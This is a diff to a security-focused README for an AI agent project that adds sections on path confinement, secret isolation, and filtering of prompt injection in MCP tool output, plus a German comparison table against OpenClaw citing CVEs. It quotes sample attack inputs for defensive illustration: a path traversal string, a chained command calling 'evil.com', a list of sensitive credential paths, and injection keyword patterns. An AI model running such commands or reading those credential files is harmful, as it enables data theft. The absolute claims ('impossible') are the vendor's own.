@@ -258,9 +258,21 @@ MCP tool responses validated with Zod schemas, instruction filtering, DATA bound
 
 ### 7. Filesystem Confinement
 
-Paths outside `process.cwd()` rejected to prevent path traversal attacks.
+`confine()` resolves all paths via `node:path.resolve()` and rejects anything outside `process.cwd()` — prevents path traversal (`../../../etc/passwd`) and symlink attacks.
 
-### 8. Hash-Chained Audit Log
+### 8. Secret Isolation
+
+- All credentials loaded exclusively from environment variables (never from files on disk)
+- Zod runtime validation ensures required secrets are present and non-empty before startup
+- No token/credential logging in console output or error handlers
+- `ANTHROPIC_API_KEY` passed to Claude Code subprocess as env var (not CLI argument — invisible in process list)
+- Sensitive file paths (`.env`, `.ssh`, `.pem`, `credentials`) escalated to L3 — the agent cannot read them
+
+### 9. MCP Response Validation
+
+MCP tool responses validated with `mcpContentSchema.safeParse()` (Zod) instead of unsafe `as` type assertions. Malformed or unexpected MCP output is rejected before reaching the orchestrator. Instruction patterns (`you must`, `execute`, `<system>`) are stripped from MCP output to prevent prompt injection via tool responses.
+
+### 10. Hash-Chained Audit Log
 
 Every action logged with SHA-256 hash chain — tamper attempts detectable by verifying chain integrity.
 
@@ -503,10 +515,12 @@ OpenClaw (ehemals Clawdbot/Moltbot) ist die bekannteste Open-Source AI-Agent-Pla
 |---------------|----------|------------|---------|
 | Netzwerk-Exposition | Web-UI auf öffentlichen Ports | Kein Web-UI, nur Messaging | **42.000+ exponierte Instanzen vs. 0** |
 | RCE via Browser | CVE-2026-25253 (CVSS 8.8): WebSocket-Hijacking | Kein Browser-Interface, kein WebSocket | **Ganzer Angriffsvektor existiert nicht** |
-| Command Injection | CVE-2026-25157 | L3-Blockierung + Shlex-Dekomposition | **Jedes Segment einzeln klassifiziert** |
+| Command Injection | CVE-2026-25157, CVE-2026-24763 (Docker Sandbox) | L3-Blockierung + Shlex-Dekomposition | **Jedes Segment einzeln klassifiziert** |
 | Verkettete Befehle | `ls && curl evil.com` passiert als einzelner String | Aufgeteilt an `&&`, `\|\|`, `;`, `\|` — jedes Segment einzeln bewertet | **Chained-Command-Bypass unmöglich** |
 | Prompt Injection | Keine spezifische Abwehr | 3-Schicht-Verteidigung + MCP-Output-Sanitisierung | **User-Input, Tool-Output und Model-Response isoliert** |
 | Marketplace-Malware | ClawHub: 7,1% der Skills leaken Credentials | Kein Marketplace, MCP mit Allowlist | **Kein unverifizierter Community-Code** |
+| Secret-Handling | Plaintext-Credentials in lokalen Dateien (Infostealer-Ziel) | Env-only, Zod-validiert, kein Token-Logging, Subprocess-Isolation | **Keine Secrets auf Disk, keine Secrets in CLI-Args** |
+| Filesystem-Zugriff | Unrestricted (Agent kann `/etc/passwd`, `.ssh/` lesen) | `confine()` — Paths außerhalb `cwd` blockiert | **Path-Traversal unmöglich** |
 
 **Warum das wichtig ist:** OpenClaw exponiert ein Web-UI auf öffentlichen Ports. Im Februar 2026 wurden 42.900 exponierte Instanzen in 82 Ländern gefunden, 15.200 davon anfällig für Remote Code Execution. geofrey.ai hat **kein einziges öffentliches Netzwerk-Interface** — die gesamte Kommunikation läuft über Telegram, WhatsApp oder Signal.
 
